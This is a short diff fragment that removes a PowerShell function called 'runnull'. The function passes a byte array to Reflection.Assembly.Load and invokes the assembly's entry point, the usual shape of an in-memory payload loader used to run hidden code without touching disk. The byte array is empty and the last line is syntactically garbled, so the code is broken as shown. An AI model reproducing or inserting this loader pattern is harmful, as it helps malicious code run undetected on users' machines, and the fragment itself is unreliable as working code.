@@ -1,5 +1,0 @@
-Function runnull
-{
-[Byte[]] $loadnull = 
-    [Reflection.Assembly]::Load($loadnull).EntryPoint.Invoke($null,$null)::[Reflection.Assembly]
-    }
